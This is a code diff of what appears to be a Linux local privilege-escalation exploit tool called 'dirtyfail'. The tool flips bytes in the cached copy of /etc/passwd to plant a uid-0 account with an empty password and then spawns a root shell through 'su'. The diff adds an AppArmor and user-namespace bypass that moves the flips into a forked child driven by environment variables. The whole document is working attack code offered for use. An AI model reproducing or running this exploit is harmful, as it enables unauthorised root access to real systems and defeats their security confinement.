@@ -24,9 +24,11 @@
 
 #include "backdoor.h"
 #include "copyfail_gcm.h"
+#include "apparmor_bypass.h"
 
 #include <fcntl.h>
 #include <pwd.h>
+#include <stdlib.h>
 #include <sys/stat.h>
 
 #define STATE_FILE   "/var/tmp/.dirtyfail.state"
@@ -191,7 +193,48 @@ static bool apply_flips(off_t base_off, const char *cur, const char *want, size_
     return true;
 }
 
-/* ---- install -------------------------------------------------------- */
+/* ---- INNER (bypass userns) — does only the byte flips ------------- */
+
+df_result_t backdoor_install_inner(void)
+{
+    const char *off_s    = getenv("DIRTYFAIL_LINE_OFF");
+    const char *victim_s = getenv("DIRTYFAIL_VICTIM_LINE");
+    const char *target_s = getenv("DIRTYFAIL_TARGET_LINE");
+    if (!off_s || !victim_s || !target_s) {
+        log_bad("inner: DIRTYFAIL_LINE_OFF / VICTIM_LINE / TARGET_LINE not set");
+        return DF_TEST_ERROR;
+    }
+    off_t line_off = (off_t)atoll(off_s);
+    size_t len = strlen(victim_s);
+    if (strlen(target_s) != len) {
+        log_bad("inner: victim/target lengths differ (%zu vs %zu)",
+                len, strlen(target_s));
+        return DF_TEST_ERROR;
+    }
+    if (!apply_flips(line_off, victim_s, target_s, len)) {
+        return DF_EXPLOIT_FAIL;
+    }
+    return DF_EXPLOIT_OK;
+}
+
+df_result_t backdoor_cleanup_inner(void)
+{
+    const char *off_s    = getenv("DIRTYFAIL_LINE_OFF");
+    const char *victim_s = getenv("DIRTYFAIL_VICTIM_LINE");
+    const char *target_s = getenv("DIRTYFAIL_TARGET_LINE");
+    if (!off_s || !victim_s || !target_s) {
+        log_bad("inner-cleanup: env vars not set");
+        return DF_TEST_ERROR;
+    }
+    off_t line_off = (off_t)atoll(off_s);
+    size_t len = strlen(victim_s);
+    if (!apply_flips(line_off, target_s, victim_s, len)) {  /* reverse direction */
+        return DF_EXPLOIT_FAIL;
+    }
+    return DF_EXPLOIT_OK;
+}
+
+/* ---- OUTER (init ns) — find_victim, save_state, fork bypass child --- */
 
 df_result_t backdoor_install(bool do_shell)
 {
@@ -224,7 +267,7 @@ df_result_t backdoor_install(bool do_shell)
         return DF_TEST_ERROR;
     }
     size_t pad_len = v.line_len - fixed_len;
-    char target[256];
+    char target[512];
     char *p = target;
     memcpy(p, DF_PREFIX, strlen(DF_PREFIX)); p += strlen(DF_PREFIX);
     memset(p, 'X', pad_len); p += pad_len;
@@ -235,22 +278,25 @@ df_result_t backdoor_install(bool do_shell)
     log_warn("about to length-match overwrite '%s' → '%s' (%zu bytes)",
              v.name, NEW_USER, v.line_len);
     log_warn("ON-DISK /etc/passwd is unchanged. State stashed at %s.", STATE_FILE);
-    log_warn("After exit, `su - %s` from any user drops a root shell until cache evicts.",
-             NEW_USER);
-    if (!typed_confirm("DIRTYFAIL")) {
-        log_bad("confirmation declined");
-        return DF_OK;
-    }
+    if (!typed_confirm("DIRTYFAIL")) { log_bad("confirmation declined"); return DF_OK; }
 
-    if (!save_state(v.line_off, v.line, v.line_len)) {
-        return DF_TEST_ERROR;
-    }
+    if (!save_state(v.line_off, v.line, v.line_len)) return DF_TEST_ERROR;
 
-    if (!apply_flips(v.line_off, v.line, target, v.line_len)) {
+    /* Hand off to inner via env vars. */
+    char off_str[32];
+    snprintf(off_str, sizeof(off_str), "%lld", (long long)v.line_off);
+    setenv("DIRTYFAIL_INNER_MODE",   "backdoor-install", 1);
+    setenv("DIRTYFAIL_LINE_OFF",     off_str,            1);
+    setenv("DIRTYFAIL_VICTIM_LINE",  v.line,             1);
+    setenv("DIRTYFAIL_TARGET_LINE",  target,             1);
+
+    int rc = apparmor_bypass_fork_arm(0, NULL);
+    if (rc != DF_EXPLOIT_OK) {
+        log_bad("inner backdoor-install failed (exit=%d)", rc);
         return DF_EXPLOIT_FAIL;
     }
 
-    /* Verify */
+    /* Verify in init ns */
     if (!(pw = getpwnam(NEW_USER)) || pw->pw_uid != 0) {
         log_bad("post-flip getpwnam(%s) doesn't show uid 0 — install failed",
                 NEW_USER);
@@ -262,13 +308,11 @@ df_result_t backdoor_install(bool do_shell)
              STATE_FILE);
 
     if (!do_shell) return DF_EXPLOIT_OK;
-    log_ok("invoking 'su - %s' (PAM nullok accepts empty password)", NEW_USER);
+    log_ok("invoking 'su - %s' in init ns (PAM nullok → REAL ROOT)", NEW_USER);
     execlp("su", "su", "-", NEW_USER, (char *)NULL);
     log_bad("execlp: %s", strerror(errno));
     return DF_EXPLOIT_FAIL;
 }
-
-/* ---- cleanup -------------------------------------------------------- */
 
 df_result_t backdoor_cleanup(void)
 {
@@ -283,7 +327,7 @@ df_result_t backdoor_cleanup(void)
     }
     log_step("restoring %zu bytes at offset %lld", victim_len, (long long)line_off);
 
-    /* Read the CURRENT bytes (post-install). */
+    /* Read CURRENT bytes (post-install) so we know what to flip back from. */
     int fd = open("/etc/passwd", O_RDONLY);
     if (fd < 0) { log_bad("open passwd: %s", strerror(errno)); return DF_TEST_ERROR; }
     char cur[512];
@@ -292,14 +336,25 @@ df_result_t backdoor_cleanup(void)
         close(fd); return DF_TEST_ERROR;
     }
     close(fd);
+    cur[victim_len] = '\0';
 
-    if (!apply_flips(line_off, cur, victim_line, victim_len)) {
+    /* Hand off to inner. inner runs apply_flips(off, target=cur, victim=victim_line)
+     * to flip back from current state to original. */
+    char off_str[32];
+    snprintf(off_str, sizeof(off_str), "%lld", (long long)line_off);
+    setenv("DIRTYFAIL_INNER_MODE",  "backdoor-cleanup", 1);
+    setenv("DIRTYFAIL_LINE_OFF",    off_str,            1);
+    setenv("DIRTYFAIL_VICTIM_LINE", victim_line,        1);
+    setenv("DIRTYFAIL_TARGET_LINE", cur,                1);
+
+    int rc = apparmor_bypass_fork_arm(0, NULL);
+    if (rc != DF_EXPLOIT_OK) {
+        log_bad("inner backdoor-cleanup failed (exit=%d)", rc);
         return DF_EXPLOIT_FAIL;
     }
 
     unlink(STATE_FILE);
-    log_ok("backdoor cleaned — '%s' line restored, state file removed",
-           victim_line);
+    log_ok("backdoor cleaned — line restored, state file removed");
 
 #ifdef POSIX_FADV_DONTNEED
     int e = open("/etc/passwd", O_RDONLY);
